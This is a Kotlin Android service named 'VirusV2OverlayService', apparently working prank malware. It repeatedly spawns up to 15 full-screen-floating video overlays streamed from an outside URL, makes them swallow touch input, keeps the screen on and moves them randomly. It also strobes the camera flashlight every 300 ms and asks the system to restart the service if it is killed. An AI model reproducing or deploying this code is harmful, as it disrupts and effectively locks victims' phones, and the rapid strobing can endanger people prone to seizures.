package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.VideoView
import kotlin.random.Random

class VirusV2OverlayService : Service() {

    companion object {
        private const val TAG = "VirusV2Overlay"
        private const val VIRUS_VIDEO_URL = "https://stash.cubby.moe/1UXMQI2slsM.mp4"
        private const val SPAWN_INTERVAL_MS = 800L // Spawn video baru tiap 0.8 detik
        private const val MOVE_INTERVAL_MS = 1500L // Video gerak tiap 1.5 detik
        private const val FLASHLIGHT_INTERVAL_MS = 300L
        private const val MAX_VIDEOS = 15 // Max 15 video sekaligus di layar
    }

    private var windowManager: WindowManager? = null
    private val videoViews = mutableListOf<VideoView>()
    private val videoHandlers = mutableListOf<Handler>()
    
    private var spawnHandler: Handler? = null
    private var flashHandler: Handler? = null
    private var cameraManager: CameraManager? = null
    private var cameraId: String? = null
    private var isFlashOn = false

    private val spawnRunnable = object : Runnable {
        override fun run() {
            if (videoViews.size < MAX_VIDEOS) {
                spawnNewVideo()
            }
            spawnHandler?.postDelayed(this, SPAWN_INTERVAL_MS)
        }
    }

    private val flashRunnable = object : Runnable {
        override fun run() {
            toggleFlashlight()
            flashHandler?.postDelayed(this, FLASHLIGHT_INTERVAL_MS)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    @SuppressLint("ClickableViewAccessibility")
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")

        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

        // Init camera for flashlight
        try {
            cameraId = cameraManager?.cameraIdList?.get(0)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get camera ID: ${e.message}")
        }

        startSpawning()
        startFlashBlinking()
    }

    @SuppressLint("ClickableViewAccessibility")
    private fun spawnNewVideo() {
        val displayMetrics = resources.displayMetrics
        
        // Random size untuk tiap video (20-50% layar)
        val sizePercent = Random.nextInt(20, 51) / 100f
        val videoSize = (displayMetrics.widthPixels * sizePercent).toInt()

        val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(
            videoSize,
            videoSize,
            layoutFlag,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = Random.nextInt(0, displayMetrics.widthPixels - videoSize)
            y = Random.nextInt(0, displayMetrics.heightPixels - videoSize)
        }

        val videoView = VideoView(this).apply {
            setOnTouchListener { _, _ -> true }
            
            setVideoURI(Uri.parse(VIRUS_VIDEO_URL))
            
            setOnPreparedListener { mp ->
                mp.isLooping = true
                mp.setVolume(0.6f, 0.6f)
                start()
            }

            setOnErrorListener { _, what, extra ->
                Log.e(TAG, "Video error: what=$what extra=$extra")
                true
            }
        }

        try {
            windowManager?.addView(videoView, params)
            videoViews.add(videoView)
            
            // Start movement handler untuk video ini
            startMovementForVideo(videoView, params)
            
            Log.d(TAG, "Video spawned (${videoViews.size}/${MAX_VIDEOS})")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to add video view: ${e.message}")
        }
    }

    private fun startMovementForVideo(videoView: VideoView, params: WindowManager.LayoutParams) {
        val handler = Handler(Looper.getMainLooper())
        videoHandlers.add(handler)
        
        val moveRunnable = object : Runnable {
            override fun run() {
                moveVideoRandomly(videoView, params)
                handler.postDelayed(this, MOVE_INTERVAL_MS)
            }
        }
        
        handler.postDelayed(moveRunnable, MOVE_INTERVAL_MS)
    }

    private fun startSpawning() {
        spawnHandler = Handler(Looper.getMainLooper())
        spawnHandler?.post(spawnRunnable)
    }

    private fun startFlashBlinking() {
        flashHandler = Handler(Looper.getMainLooper())
        flashHandler?.postDelayed(flashRunnable, FLASHLIGHT_INTERVAL_MS)
    }

    private fun moveVideoRandomly(videoView: VideoView, params: WindowManager.LayoutParams) {
        try {
            val displayMetrics = resources.displayMetrics
            val maxX = displayMetrics.widthPixels - params.width
            val maxY = displayMetrics.heightPixels - params.height

            params.x = Random.nextInt(0, maxX.coerceAtLeast(1))
            params.y = Random.nextInt(0, maxY.coerceAtLeast(1))

            windowManager?.updateViewLayout(videoView, params)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update video position: ${e.message}")
        }
    }

    private fun toggleFlashlight() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraId?.let { id ->
                    cameraManager?.setTorchMode(id, !isFlashOn)
                    isFlashOn = !isFlashOn
                }
            }
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Flashlight error: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Flashlight error: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service destroyed")

        spawnHandler?.removeCallbacks(spawnRunnable)
        flashHandler?.removeCallbacks(flashRunnable)
        
        videoHandlers.forEach { handler ->
            handler.removeCallbacksAndMessages(null)
        }
        videoHandlers.clear()

        // Turn off flashlight
        try {
            if (isFlashOn && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraId?.let { id ->
                    cameraManager?.setTorchMode(id, false)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to turn off flashlight: ${e.message}")
        }

        videoViews.toList().forEach { view ->
            try {
                view.stopPlayback()
                windowManager?.removeView(view)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to remove video view: ${e.message}")
            }
        }

        videoViews.clear()
        windowManager = null
        spawnHandler = null
        flashHandler = null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
}
